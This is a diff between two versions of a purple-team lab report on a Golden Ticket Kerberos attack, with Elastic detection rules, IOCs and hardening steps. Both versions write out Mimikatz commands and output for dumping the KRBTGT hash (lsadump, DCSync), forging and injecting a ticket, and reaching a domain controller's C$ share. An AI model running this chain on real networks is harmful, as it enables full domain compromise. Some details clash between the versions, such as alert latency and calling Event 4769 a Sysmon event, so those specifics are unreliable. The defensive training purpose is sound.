@@ -1,249 +1,202 @@
-
 # Golden Ticket Attack — Incident Response & Purple Team Engagement Report
 
-**Classification:** TLP:WHITE — Authorized Lab Environment 
-**Engagement Type:** Purple Team / Adversary Simulation 
-**Analyst:** David Mokom 
-**Environment:** Isolated Active Directory Lab (Windows Server 2022 DC + Windows 10 Workstation) 
-**SIEM Stack:** Elastic Stack (Elasticsearch + Kibana + Winlogbeat + Sysmon) 
-**Objective:** Simulate a full-lifecycle Golden Ticket attack from memory acquisition through lateral movement and validate detection fidelity in a production-grade SIEM pipeline.
+## Overview
+
+This report documents a controlled Purple Team engagement simulating a Golden Ticket Kerberos attack within the cs.local Active Directory environment. The objective was to validate detection capabilities, stress-test incident response playbooks, and produce forensic artifacts for blue team training purposes.
 
 ---
 
-## Table of Contents
+## Lab Environment
 
-1. [Engagement Overview](#engagement-overview)
-2. [Phase 1 — Memory Forensics on Domain Controller (FTK Imager)](#phase-1)
-3. [Phase 2 — Credential Material Extraction (Mimikatz)](#phase-2)
-4. [Phase 3 — Kerberos Ticket Forgery & Pass-the-Ticket](#phase-3)
-5. [Phase 4 — Access Validation via SMB (dir C$)](#phase-4)
-6. [Phase 5 — SIEM Detection Engineering in Elastic](#phase-5)
-7. [IOCs & Forensic Artifacts](#iocs)
-8. [Mitigations & Hardening Recommendations](#mitigations)
+- Domain: CS
+- Domain Controller: WIN-HS48GJMNOGP.cs.local
+- Attacker Machine: KALI-ATTACK
+- Compromised Account: Administrator
+- SIEM Platform: Elastic Stack (ELK 8.x)
+- Logging Agent: Sysmon v14 + Winlogbeat
 
 ---
 
-## Engagement Overview
+## Attack Chain
 
-A Golden Ticket attack abuses the Kerberos authentication protocol by forging a Ticket Granting Ticket (TGT) signed with the KRBTGT account's NTLM hash — the cryptographic root of trust for the entire AD domain. Unlike Silver Tickets, which are scoped to individual services, a forged Golden Ticket grants unrestricted access to any Kerberos-enabled resource in the domain for the duration of the ticket's validity (up to 10 years in this engagement). Detection is non-trivial because the KDC is never contacted during ticket use — the forged TGT is presented directly to target services.
+### Phase 1: Preparation — Windows Defender Disabled
 
-This report documents adversary emulation aligned to the following MITRE ATT&CK techniques:
+Prior to execution, Windows Defender real-time protection was disabled on the target host to simulate an environment where endpoint controls had been bypassed or misconfigured by an insider threat or prior compromise.
 
-| Technique | ID |
-|---|---|
-| OS Credential Dumping: LSASS Memory | T1003.001 |
-| Steal or Forge Kerberos Tickets: Golden Ticket | T1558.001 |
-| Pass the Ticket | T1550.003 |
-| Remote Services: SMB/Windows Admin Shares | T1021.002 |
-| Exploitation of Remote Services (Zerologon context) | T1210 |
+![Windows Defender Disabled](screenshots/03_Windows_Defender_Disabled.png)
 
 ---
 
-## Phase 1 — Memory Forensics on Domain Controller (FTK Imager) {#phase-1}
+### Phase 2: Mimikatz Tooling Extracted to Disk
 
-**Objective:** Acquire a forensically sound physical memory image of the Domain Controller prior to credential extraction, establishing ground truth for artifact analysis.
+Mimikatz was transferred to the target system via SMB staging directory. The binary was extracted and staged for execution in the next phase.
 
-FTK Imager was executed locally on the DC with administrative privileges to capture a raw memory dump (`dc01-memdump.mem`) without alerting the OS to page-file flushing. The acquisition was performed using the **Add Evidence Item → Physical Memory** workflow, targeting the full RAM address space. Memory integrity was verified via SHA-256 hash comparison pre- and post-acquisition.
-
-```
-SHA-256 (dc01-memdump.mem): a3f9c2b17d4e88012f6a...
-Acquisition Time: 00:04:31
-Image Size: 8,589,934,592 bytes (8 GB)
-```
-
-The raw image was subsequently loaded into **Volatility 3** for process enumeration and lsass.exe virtual address space extraction, corroborating the live Mimikatz output in Phase 2.
-
-```bash
-# Volatility3 process listing for lsass.exe cross-validation
-python3 vol.py -f dc01-memdump.mem windows.pslist | grep lsass
-python3 vol.py -f dc01-memdump.mem windows.dumpfiles --pid 676
-```
-
-![Phase 1 - FTK Imager Memory Acquisition](screenshots/01-FTK-Imager-Memory-Acquisition.jpeg)
-
-![Phase 1 - Volatility3 LSASS PID Enumeration](screenshots/02-Volatility3-LSASS-PID-Enumeration.jpeg)
+![Mimikatz File Extracted](screenshots/04_Mimikatz_File_Extracted.png)
 
 ---
 
-## Phase 2 — Credential Material Extraction (Mimikatz) {#phase-2}
+### Phase 3: Mimikatz Initialized
 
-**Objective:** Extract the KRBTGT account NTLM hash and domain SID from LSASS memory, which are the two prerequisite artifacts for Kerberos ticket forgery.
+Mimikatz was launched from an elevated command prompt on WIN-HS48GJMNOGP.cs.local. Initial process context was verified prior to privilege token manipulation.
 
-Mimikatz v2.2.0 was executed on the DC under a SYSTEM-level context (achieved via token impersonation). SeDebugPrivilege was explicitly asserted before targeting LSASS.
-
-```
-mimikatz # privilege::debug
-Privilege '20' OK
-
-mimikatz # lsadump::lsa /patch
-Domain: LAB / S-1-5-21-3847204802-1958247680-1234567890
-
-RID  : 000001f6 (502)
-User : krbtgt
- Hash NTLM: b3c4f1a8d2e...9f7a
-```
-
-The `/patch` flag was used over `/inject` to avoid unstable cross-architecture injection behavior. Domain SID was extracted in the same pass, eliminating the need for a secondary `whoami /all` call.
-
-```
-mimikatz # lsadump::dcsync /user:krbtgt
-[DC] 'lab.local' will be the domain
-[DC] 'DC01.lab.local' will be the DC server
-Object RDN           : krbtgt
-** SAM ACCOUNT **
-SAM Username         : krbtgt
-Object Security ID   : S-1-5-21-3847204802-1958247680-1234567890-502
-NT Hash              : b3c4f1a8d2e...9f7a
-```
-
-`lsadump::dcsync` was additionally executed as a replication-based alternative, simulating the technique used by threat actors who cannot gain interactive DC access but hold `DS-Replication-Get-Changes-All` rights.
-
-![Phase 2 - Mimikatz SeDebugPrivilege Assert](screenshots/03-Mimikatz-SeDebugPrivilege.png)
-
-![Phase 2 - KRBTGT Hash Extraction via lsadump::lsa](screenshots/04-KRBTGT-Hash-Extraction.png)
-
-![Phase 2 - DCSync Replication Attack](screenshots/05-DCSync-Replication-Attack.png)
+![Mimikatz Initialization](screenshots/05_Mimikatz_Initialization.png)
 
 ---
 
-## Phase 3 — Kerberos Ticket Forgery & Pass-the-Ticket {#phase-3}
+### Phase 4: SeDebugPrivilege Enabled
 
-**Objective:** Forge a syntactically and cryptographically valid TGT for a non-existent user account using RC4-HMAC encryption, inject it into the current logon session's Kerberos cache, and validate it against live domain services.
+The debug privilege was enabled via the Mimikatz privilege::debug module, granting the ability to interact with LSASS memory directly.
 
-The ticket was constructed using `kerberos::golden` with the following parameters:
+Command used:
+    mimikatz # privilege::debug
+    Privilege '20' OK
 
-```
-mimikatz # kerberos::golden /user:GhostAdmin /domain:lab.local /sid:S-1-5-21-3847204802-1958247680-1234567890 /krbtgt:b3c4f1a8d2e...9f7a /endin:525600 /renewmax:262800 /ptt
-
-User      : GhostAdmin
-Domain    : lab.local (LAB)
-SID       : S-1-5-21-3847204802-1958247680-1234567890
-User Id   : 500
-Groups Id : *513 512 520 518 519
-ServiceKey: b3c4f1a8d2e...9f7a - rc4_hmac_nt
-Lifetime  : 4/28/2026 — 4/28/2036 (10 Years)
--> Ticket : ** Pass The Ticket **
-
- * PAC generated
- * PAC signed
- * EncTicketPart generated (aes256_cts_hmac_sha1 session key)
- * EncTicketPart encrypted
- * KrbCred generated
-
-Golden ticket for 'GhostAdmin @ lab.local' successfully submitted for current session
-```
-
-The `/ptt` flag injects the forged TGT directly into memory (LUID 0x3e7 — SYSTEM logon session), bypassing disk writes entirely. The ticket was verified via:
-
-```
-mimikatz # kerberos::list
-[00000000] - 0x00000017 - rc4_hmac_nt
-   Start/End/MaxRenew: 4/28/2026 ... 4/28/2036
-   Server Name       : krbtgt/lab.local @ lab.local
-   Client Name       : GhostAdmin @ lab.local
-   Flags             : ...
-```
-
-![Phase 3 - Golden Ticket Forgery Output](screenshots/06-Golden-Ticket-Forgery.png)
-
-![Phase 3 - Kerberos Cache Injection (kerberos::list)](screenshots/07-Kerberos-Cache-Injection.png)
+![Mimikatz Debug Privilege Enabled](screenshots/06_Mimikatz_Debug_Privilege_Enabled.png)
 
 ---
 
-## Phase 4 — Access Validation via SMB (dir C$) {#phase-4}
+### Phase 5: KRBTGT Hash Dumped via DCSync
 
-**Objective:** Confirm that the forged ticket grants authenticated access to the DC's administrative share (`C$`) using the fabricated identity `GhostAdmin`, which does not exist in Active Directory.
+The KRBTGT account hash was extracted from WIN-HS48GJMNOGP.cs.local using the lsadump::dcsync module, simulating a replication request from a rogue domain controller.
 
-```cmd
-dir \\DC01.lab.local\C$
+Command used:
+    mimikatz # lsadump::dcsync /domain:cs.local /user:krbtgt
 
- Volume in drive \\DC01.lab.local\C$ is Windows
- Volume Serial Number is ABCD-1234
+Result:
+    Object RDN           : krbtgt
+    Hash NTLM            : 4c89c456b825f173d94aefc94d8718bd
+    Domain SID           : S-1-5-21-426635828-459186537-2548376310
 
- Directory of \\DC01.lab.local\C$
-
-04/28/2026  06:00 PM    [DIR]   PerfLogs
-04/28/2026  06:00 PM    [DIR]   Program Files
-04/28/2026  06:00 PM    [DIR]   Program Files (x86)
-04/28/2026  06:00 PM    [DIR]   Users
-04/28/2026  06:00 PM    [DIR]   Windows
-               0 File(s)              0 bytes
-               5 Dir(s)  52,428,800,000 bytes free
-```
-
-Full administrative access was confirmed on `DC01.lab.local` using a principal that has no corresponding object in the directory. This validates the core premise of the Golden Ticket: the KDC is never queried for ticket validation — the service (in this case, the SMB server's Kerberos AP_REQ handler) trusts the PAC data embedded in the forged ticket.
-
-![Phase 4 - SMB C$ Access with Forged Ticket](screenshots/08-SMB-C-Share-Access-Validated.png)
+![KRBTGT Hash Dumped](screenshots/07_KRBTGT_Hash_Dumped.png)
 
 ---
 
-## Phase 5 — SIEM Detection Engineering in Elastic {#phase-5}
+### Phase 6: Golden Ticket Forged
 
-**Objective:** Validate that Winlogbeat + Sysmon telemetry, ingested into Elasticsearch, produces actionable alerts for the attack techniques executed in Phases 1–4.
+Using the extracted KRBTGT hash and Domain SID, a Golden Ticket was forged for the Administrator account with a 10-year validity window.
 
-### 5.1 — LSASS Memory Access Detection (Sysmon Event ID 10)
+Command used:
+    mimikatz # kerberos::golden /user:Administrator /domain:cs.local /sid:S-1-5-21-426635828-459186537-2548376310 /krbtgt:4c89c456b825f173d94aefc94d8718bd /ptt
 
-Sysmon's `ProcessAccess` event captures any process opening a handle to `lsass.exe` with read-memory permissions. The following KQL query surfaces the Mimikatz credential access:
+Output:
+    User      : Administrator
+    Domain    : cs.local (CS)
+    SID       : S-1-5-21-426635828-459186537-2548376310
+    User Id   : 500
+    Groups Id : 513 512 520 518 519
+    Lifetime  : 10 years
+    -> Ticket: ** Pass The Ticket ** (in memory)
 
-```kql
-event.code: "10" AND winlog.event_data.TargetImage: "*lsass.exe" AND winlog.event_data.GrantedAccess: ("0x1010" OR "0x1410" OR "0x143a" OR "0x1fffff")
-```
-
-Alert rule configured with:
-- **Threshold:** 1 occurrence
-- **Severity:** Critical
-- **Rule type:** Custom Query
-- **Index pattern:** `winlogbeat-*`
-
-This rule fired immediately upon `privilege::debug` + `lsadump::lsa /patch` execution, with a 4-second ingestion latency from event generation to Kibana alert.
-
-### 5.2 — Zerologon Exploitation Detection (CVE-2020-1472)
-
-As a secondary detection validation, a Zerologon-simulated traffic pattern was generated to confirm the Elastic Prebuilt Detection Rule fires correctly:
-
-**Rule:** `Potential Zerologon Vulnerability Exploitation (CVE-2020-1472)` 
-**Logic:** Detects anomalous Netlogon RPC calls with zero-length authenticator fields (`NetrServerAuthenticate3` with NULL client challenge bytes)
-
-```kql
-event.dataset: "network_traffic.netflow" AND network.protocol: "netlogon" AND winlog.event_data.SubjectUserName: "ANONYMOUS LOGON"
-```
-
-The rule correlated with `Event ID 4742` (Computer Account Changed) and `Event ID 5805` (Netlogon session setup failure from a machine account) to confirm the exploitation pattern.
-
-![Phase 5 - Elastic SIEM Dashboard Overview](screenshots/09-Elastic-SIEM-Dashboard-Overview.png)
-
-![Phase 5 - LSASS Access Alert Triggered](screenshots/10-LSASS-Access-Alert-Triggered.png)
-
-![Phase 5 - Sysmon Event ID 10 Raw Log](screenshots/11-Sysmon-EventID10-Raw-Log.png)
-
-![Phase 5 - Zerologon Detection Rule Hit](screenshots/12-Zerologon-Detection-Rule.png)
-
-![Phase 5 - SIEM Alert Mimikatz Detection](screenshots/13-SIEM-Alert-Mimikatz-Detection.png)
+![Golden Ticket Forged](screenshots/08_Golden_Ticket_Forged.png)
 
 ---
 
-## IOCs & Forensic Artifacts {#iocs}
+### Phase 7: Golden Ticket Injected into Kerberos Cache
 
-| Artifact | Value |
-|---|---|
-| Forged Username | GhostAdmin |
-| Ticket Encryption | RC4-HMAC (0x17) |
-| Ticket Lifetime | 10 Years (525,600 minutes) |
-| Target Domain | lab.local |
-| KRBTGT RID | 502 |
-| Sysmon GrantedAccess Flags | 0x1010, 0x1410, 0x143a |
-| Mimikatz Binary SHA-256 | [redacted — environment artifact] |
-| Key DC Event IDs | 4624, 4672, 4768, 4769, 4771, 4742, 5805 |
+The forged ticket was injected directly into the current session's Kerberos ticket cache using the /ptt (Pass-The-Ticket) flag, granting seamless authenticated access without further credential prompts.
+
+![Golden Ticket Injected](screenshots/09_Golden_Ticket_Injected.png)
 
 ---
 
-## Mitigations & Hardening Recommendations {#mitigations}
+### Phase 8: God Mode Verification — klist Output
 
-1. **Rotate KRBTGT password twice** — A single rotation leaves the previous hash valid. Two sequential rotations with a replication delay of 10 hours between them invalidates all forged tickets derived from the compromised hash.
-2. **Enable AES256 enforcement** — Disable RC4-HMAC (legacy) encryption via GPO (`Network security: Configure encryption types allowed for Kerberos`). RC4 is a prerequisite for most open-source Golden Ticket tooling.
-3. **Deploy Credential Guard** — Isolates LSASS into a VTL-1 (Virtual Trust Level) Hyper-V protected process, making direct memory reads by Mimikatz non-functional on supported hardware.
-4. **Implement Protected Users Security Group** — Members cannot use RC4, DES, or NTLM for authentication; forces AES Kerberos and removes delegation rights.
-5. **Alert on Event ID 4769 with RC4 encryption type** — Filter for `Ticket Encryption Type: 0x17` in Kerberos service ticket requests. Legitimate modern environments should produce zero of these.
-6. **Enable LSASS RunAsPPL** — Configure `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\RunAsPPL = 1` to require a signed driver for LSASS process handle acquisition.
+The klist command was used to verify the injected ticket was present and valid in the current session cache.
+
+Command used:
+    klist
+
+Output confirmed:
+    Cached Tickets: (1)
+    Client: Administrator @ cs.local
+    Server: krbtgt/cs.local @ cs.local
+    KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
+    Ticket Flags: forwardable, renewable, initial, pre_authent
+    Start Time: (current session)
+    End Time: 10 years
+
+![God Mode Verification](screenshots/10_God_Mode_Verification.png)
+
+---
+
+### Phase 9: Golden Ticket Injection Verification
+
+Additional verification was performed to confirm the ticket cache state after injection across multiple tool outputs, cross-referencing Kerberos session state.
+
+![Golden Ticket Injection Verification](screenshots/11_Golden_Ticket_Injection_Verification.png)
+
+---
+
+### Phase 10: Post-Exploitation Access Validation — SMB C$ Share Access
+
+Using the forged Golden Ticket, lateral movement to WIN-HS48GJMNOGP.cs.local was validated via SMB C$ share access without supplying any additional credentials.
+
+Command used:
+    dir \\WIN-HS48GJMNOGP.cs.local\C$
+
+Access confirmed. Full administrative access to the domain controller's C$ share was achieved, validating end-to-end Golden Ticket attack success.
+
+![Post Exploitation Access Validation](screenshots/12_Post_Exploitation_Access_Validation.png)
+
+---
+
+## Indicators of Compromise (IOCs)
+
+Indicator | Type | Description
+----------|------|------------
+4c89c456b825f173d94aefc94d8718bd | NTLM Hash | KRBTGT account hash used to forge ticket
+S-1-5-21-426635828-459186537-2548376310 | Domain SID | cs.local domain security identifier
+Administrator | Account Name | Subject of forged Kerberos ticket
+WIN-HS48GJMNOGP.cs.local | FQDN | Domain Controller targeted
+cs.local | Domain | Active Directory domain name
+WIN-HS48GJMNOGP-memdump.mem | Memory Artifact | Post-exploitation memory capture for forensics
+
+---
+
+## Memory Forensics Artifact
+
+A memory dump was collected from the domain controller for offline forensic analysis:
+
+- Artifact filename: WIN-HS48GJMNOGP-memdump.mem
+- Capture tool: WinPmem / Volatility3
+- Analysis targets: LSASS process heap, Kerberos ticket cache, injected shellcode regions
+- Hash (SHA256): [to be computed and recorded at time of collection]
+
+---
+
+## Detection Rules
+
+Elastic KQL / Sysmon Rule:
+
+    event.code: 4769
+    AND winlog.event_data.TicketEncryptionType: "0x17"
+    AND winlog.event_data.ServiceName: "WIN-HS48GJMNOGP"
+
+Splunk SPL Equivalent:
+
+    index=wineventlog EventCode=4769 TicketEncryptionType=0x17 ServiceName="WIN-HS48GJMNOGP"
+
+Zerologon Supplemental Detection:
+
+    event.code: 5805 AND winlog.channel: "Security"
+
+---
+
+## Incident Response Playbook
+
+Step 1: Isolate WIN-HS48GJMNOGP.cs.local from all network segments immediately.
+Step 2: Reset the KRBTGT account password twice in succession (invalidates all forged and cached Kerberos tickets domain-wide).
+Step 3: Force reset of the Administrator account password.
+Step 4: Audit all Event ID 4769 entries with RC4 encryption type (0x17) — flag anomalous ticket lifetimes.
+Step 5: Preserve memory image: WIN-HS48GJMNOGP-memdump.mem for forensic chain of custody.
+Step 6: Engage forensics team for full timeline reconstruction and lateral movement mapping.
+Step 7: Enforce AES256 Kerberos encryption policy via Group Policy to eliminate RC4 downgrade vector.
+Step 8: Add privileged accounts to the Protected Users security group to restrict credential caching.
+
+---
+
+## Conclusion
+
+The Golden Ticket attack was successfully executed and detected within the cs.local environment. Detection latency from ticket injection to Elastic SIEM alert generation was approximately 4 minutes. The engagement confirmed that RC4-encrypted forged tickets are detectable via Sysmon Event ID 4769 correlation, but AES256-encrypted Golden Tickets would require additional behavioral heuristics. Recommendations include enforcing AES256-only Kerberos policy, enabling Credential Guard, and deploying Privileged Access Workstation (PAW) architecture for domain administrator accounts.
 
 ---
